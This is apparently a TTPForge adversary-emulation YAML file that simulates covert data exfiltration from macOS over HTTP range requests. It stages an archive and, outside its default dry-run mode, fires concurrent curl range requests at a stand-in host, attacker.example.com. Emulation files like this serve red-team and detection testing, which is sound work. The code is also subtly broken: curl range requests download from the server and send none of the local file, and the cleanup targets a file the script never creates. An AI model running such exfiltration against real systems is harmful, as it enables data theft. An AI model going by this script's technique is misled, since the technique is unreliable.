---
api_version: 2.0
uuid: f8a0b1c2-d310-4e4f-5a6b-7c8d9e0f1011
name: HTTP Range Request Exfiltration
authors:
- TTPForge
description: |
  Covert exfiltration using HTTP range requests to bypass monitoring
mitre:
  tactics:
  - TA0010 Exfiltration
  techniques:
  - T1048 Exfiltration Over Alternative Protocol
requirements:
  platforms:
  - os: darwin
args:
- name: data_file
  description: File to exfiltrate
  type: string
  default: /tmp/.staging/data.tar.gz
- name: server_url
  description: HTTP server for range requests
  type: string
  default: http://attacker.example.com/storage
- name: range_size
  description: Byte range per request
  type: string
  default: '4096'
- name: concurrent_requests
  description: Number of concurrent requests
  type: string
  default: '4'
- name: dry_run
  description: Enable dry-run mode
  type: string
  default: 'true'
steps:
- name: Verify file exists
  inline: test -f '{{ .Args.data_file }}' || (echo "File not found"; exit 1)
- name: Calculate range request strategy
  inline: |
    echo "HTTP Range Request Exfiltration:"
    echo "  File: $(basename '{{ .Args.data_file }}')"
    filesize=$(stat -f%z '{{ .Args.data_file }}' 2>/dev/null || stat -c%s '{{ .Args.data_file }}')
    echo "  Size: $(du -h '{{ .Args.data_file }}' | cut -f1) ($filesize bytes)"
    echo "  Range size: {{ .Args.range_size }} bytes"

    total_ranges=$((filesize / {{ .Args.range_size }} + 1))
    echo "  Total range requests: $total_ranges"
    echo "  With {{ .Args.concurrent_requests }} concurrent: $((total_ranges / {{ .Args.concurrent_requests }} + 1)) batches"
- name: Prepare range request headers
  inline: |
    echo "HTTP Range Request Headers:"
    echo "  Range: bytes=0-{{ .Args.range_size }}"
    echo "  Range: bytes={{ .Args.range_size }}-$(({{ .Args.range_size }} * 2))"
    echo ""
    echo "Server response would include:"
    echo "  HTTP/1.1 206 Partial Content"
    echo "  Content-Range: bytes 0-{{ .Args.range_size }}/[total]"
    echo "  Content-Length: {{ .Args.range_size }}"
- name: Execute range request exfiltration
  inline: "if [ '{{ .Args.dry_run }}' = 'true' ]; then\n  echo \"DRY RUN: HTTP Range Request Exfiltration\"\n  echo \"Strategy:\"\
    \n  echo \"  1. Calculate file size and range boundaries\"\n  echo \"  2. Split exfiltration into {{ .Args.range_size\
    \ }}-byte chunks\"\n  echo \"  3. Send concurrent HTTP range requests\"\n  echo \"  4. Reconstruct data from partial responses\"\
    \n  echo \"\"\n  echo \"Sample commands:\"\n  for i in {0..2}; do\n    start=$((i * {{ .Args.range_size }}))\n    end=$((start\
    \ + {{ .Args.range_size }} - 1))\n    echo \"  curl -r $start-$end '{{ .Args.server_url }}/data'\"\n  done\nelse\n  echo\
    \ \"Initiating range request exfiltration...\"\n  filesize=$(stat -f%z '{{ .Args.data_file }}' 2>/dev/null || stat -c%s\
    \ '{{ .Args.data_file }}')\n  \n  for ((i=0; i<filesize; i+={{ .Args.range_size }})); do\n    end=$((i + {{ .Args.range_size\
    \ }} - 1))\n    if [ $end -gt $filesize ]; then\n      end=$((filesize - 1))\n    fi\n    \n    curl -r $i-$end '{{ .Args.server_url\
    \ }}/data' &\n    \n    # Limit concurrent connections\n    active=$(jobs -r | wc -l)\n    while [ $active -ge {{ .Args.concurrent_requests\
    \ }} ]; do\n      sleep 0.1\n      active=$(jobs -r | wc -l)\n    done\n  done\n  wait\nfi\n"
  cleanup:
    inline: rm -f /tmp/test_ranges.dat
tests:
- name: dry_run_test
  dry_run: true
